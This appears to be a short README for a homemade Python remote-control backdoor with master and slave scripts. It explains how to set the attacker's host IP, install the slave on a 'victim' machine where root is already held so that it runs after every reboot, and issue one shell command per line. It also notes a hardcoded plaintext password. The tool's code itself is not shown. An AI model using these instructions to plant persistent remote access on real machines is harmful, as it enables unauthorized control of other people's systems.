
How to:
  - Change the host IP in both the master.py and slave.py
  - Change the variable PYTHON_SLAVE in install.sh to the absolute path of slave.py in the victim.


The default password is '123456' stored as plain string in slave.py code.

As it's situation dependent I decided against deciding the IP dinamically.
based on:
https://stackoverflow.com/questions/166506/finding-local-ip-addresses-using-pythons-stdlib

This "package" assumes the attacker already has root access in the victim
Then, you send the slave.py and execute the install.sh in the victim.
Now, after every reboot slave.py will run.


Details: The program can only handle one command per line, more than one the behaviour is not specified:
ex:
cd ..; ls
won't work.


To run the programs:

sudo python2.7 /path/to/master.py

or

sudo python2.7 /path/to/slave.py
